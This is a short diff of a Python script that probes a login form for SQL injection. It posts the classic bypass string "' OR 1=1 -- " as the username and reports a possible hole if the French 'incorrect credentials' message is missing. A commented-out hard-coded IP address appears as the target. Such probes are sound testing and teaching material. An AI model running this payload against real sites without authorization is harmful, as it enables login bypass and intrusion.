@@ -5,16 +5,16 @@ url = input("Choose url: ")
 """url = "http://51.15.136.118/pageid.php" """
 
 # The parameter you want to test for SQL injection
-param = "password"
+usr = "' OR 1=1 -- "
 
-# The value you want to send to the parameter
-value = "' OR 1=1;--"
+passwd = "whatever"
 
 # Send the request to the website
-r = requests.get(url,params={param:value})
+r = requests.post(url, data={'username': usr, 'password': passwd})
 
 # Check the response for the presence of a specific string
-if "SQL syntax" in r.text:
-    print("Possible SQL injection vulnerability")
-else:
+if "Nom d'utilisateur ou mot de passe incorrect" in r.text:
     print("No SQL injection vulnerability detected")
+else:
+    print("Possible SQL injection vulnerability")
+
